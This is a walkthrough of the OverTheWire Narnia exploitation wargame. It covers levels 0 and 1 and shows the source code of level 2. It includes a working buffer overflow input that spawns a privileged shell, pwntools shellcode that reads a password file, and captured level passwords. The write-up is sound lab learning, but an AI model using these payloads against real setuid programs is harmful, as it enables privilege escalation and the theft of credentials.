# OverTheWire Narnia
OverTheWire Narnia walkthrough

After doing the Bandit levels, I've decided to start looking at all the Over The Wire levels. And Narnia happens to be one of them. It's about basic exploitation. I've always wanted to be better at pwning so why not start here? Sadly the levels don't contain any hints so I'll immeadiatly start with the levels.

We all have to start somewhere.
Narnia is a wargame that has been rescued from the demise of intruded.net, previously hosted on narnia.intruded.net. Big thanks to adc, morla and reth for their help in resurrecting this game!

What follows below is the original description of narnia, copied from intruded.net:

Summary:
Difficulty:     2/10
Levels:         10
Platform:   Linux/x86

Author:
nite

Special Thanks:
lx_jakal for pointing out a bug that made a level easier =)

Description:
This wargame is for the ones that want to learn basic exploitation. You can see the most
common bugs in this game and we've tried to make them easy to exploit. You'll get the
source code of each level to make it easier for you to spot the vuln and abuse it. The
difficulty of the game is somewhere between Leviathan and Behemoth, but some of the
levels could be quite tricky.
Narnia’s levels are called narnia0, narnia1, … etc. and can be accessed on narnia.labs.overthewire.org through SSH on port 2226.

To login to the first level use:

Username: narnia0
Password: narnia0
Data for the levels can be found in /narnia/.

If you somehow stumble upon this repo and use it to look for tips on how to solve levels, keep in mind that the passwords rotate so they will probs not work for you.

# Level 0

```bash
wrecker1602@wrecker:/localdir$ ssh -p 2226 narnia0@narnia.labs.overthewire.org
The authenticity of host '[narnia.labs.overthewire.org]:2226 ([51.21.213.178]:2226)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[narnia.labs.overthewire.org]:2226' (ED25519) to the list of known hosts.
                                                _       
                         _ __   __ _ _ __ _ __ (_) __ _
                        | '_ \ / _` | '__| '_ \| |/ _` |
                        | | | | (_| | |  | | | | | (_| |
                        |_| |_|\__,_|_|  |_| |_|_|\__,_|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

Load key "/home/wrecker1602/.ssh/id_rsa": Is a directory
narnia0@narnia.labs.overthewire.org's password: 

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp       
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find       
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

narnia0@gibson:/narnia$ ll
total 160
drwxr-xr-x  2 root    root     4096 Apr 10 14:24 ./
drwxr-xr-x 28 root    root     4096 Jun 25 23:09 ../
-r-sr-x---  1 narnia1 narnia0 15044 Apr 10 14:23 narnia0*
-r--r-----  1 narnia0 narnia0  1229 Apr 10 14:23 narnia0.c
-r-sr-x---  1 narnia2 narnia1 14884 Apr 10 14:23 narnia1*
-r--r-----  1 narnia1 narnia1  1021 Apr 10 14:23 narnia1.c
-r-sr-x---  1 narnia3 narnia2 11280 Apr 10 14:23 narnia2*
-r--r-----  1 narnia2 narnia2  1022 Apr 10 14:23 narnia2.c
-r-sr-x---  1 narnia4 narnia3 11520 Apr 10 14:24 narnia3*
-r--r-----  1 narnia3 narnia3  1699 Apr 10 14:24 narnia3.c
-r-sr-x---  1 narnia5 narnia4 11312 Apr 10 14:24 narnia4*
-r--r-----  1 narnia4 narnia4  1080 Apr 10 14:24 narnia4.c
-r-sr-x---  1 narnia6 narnia5 11512 Apr 10 14:24 narnia5*
-r--r-----  1 narnia5 narnia5  1262 Apr 10 14:24 narnia5.c
-r-sr-x---  1 narnia7 narnia6 11568 Apr 10 14:24 narnia6*
-r--r-----  1 narnia6 narnia6  1602 Apr 10 14:24 narnia6.c
-r-sr-x---  1 narnia8 narnia7 12036 Apr 10 14:24 narnia7*
-r--r-----  1 narnia7 narnia7  1964 Apr 10 14:24 narnia7.c
-r-sr-x---  1 narnia9 narnia8 11320 Apr 10 14:24 narnia8*
-r--r-----  1 narnia8 narnia8  1269 Apr 10 14:24 narnia8.c

narnia0@gibson:/narnia$ cat narnia0.c
```
```c
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA       
   */
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
```bash
narnia0@gibson:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
buf: AAAAAAAAAAAAAAAAAAAAAAAA
val: 0x41414141
WAY OFF!!!!
```
After inputting some random nonsense the c program, it looks like it contains a buffer overflow.
```bash
narnia0@gibson:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAA
buf: AAAAAAAAAAAAAAAAAAA
val: 0x41414141
WAY OFF!!!!
narnia0@gibson:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAA
buf: AAAAAAAAAAAAAAAAAAAA
val: 0x41414100
WAY OFF!!!!
```
It seems that we have found where the buffer overflow starts, now let's convert deadbeef into something the program properly understands.
```bash
narnia0@gibson:/narnia$ python3
Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print(p64(0xdeadbeef))
b'\xef\xbe\xad\xde\x00\x00\x00\x00'
```
Now that we know where the bufferoverflow sits, and the 0xdeadbeef has turned into little-endian binary format. We can attempt to exploit the binary.
```bash
narnia0@gibson:/narnia$ echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\x00\x00\x00\x00" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
narnia0@gibson:/narnia$ whoami
narnia0
```
Okiedokie, the binary exploitation worked. But when using whoami, we are still narnia0. So how can we keep the binary running and keep the shell open?
```bash
narnia0@gibson:/narnia$ (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\x00\x00\x00\x
00"; cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
WDcYUTG5ul
```
The reason why this keeps the shell open is due to cat reading from stdin and forwards it and since it's piped into ./narnia0, it acts like a keyboard.

# Level 1

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
Looking at the code we need to change the env "EGG" into something for the program to execute it. We can create this payload with pwntools again.
```bash
narnia1@gibson:/narnia$ python3
Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> print(asm(shellcraft.cat('/etc/narnia_pass/narnia2')))
b'j\x01\xfe\x0c$hnia2h/narhpasshnia_h/narh/etc\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'
>>>
narnia1@gibson:/narnia$ export EGG=$'j\x01\xfe\x0c$hnia2h/narhpasshnia_h/narh/etc\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80' 
narnia1@gibson:/narnia$ ./narnia1
Trying to execute EGG!
5agRAXeBdG
Segmentation fault (core dumped)
```
Due to the segmentation fault, we can't try to get a shell using the egg env and setting it to /bin/bash -i. Due to this we have to directly get the password using the cat command and catting the etc password file. As you can see in the code block.

# Level 2

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
Taking a direct look at the code it seems to contain a buffer overflow, so let's try to exploit it. :)
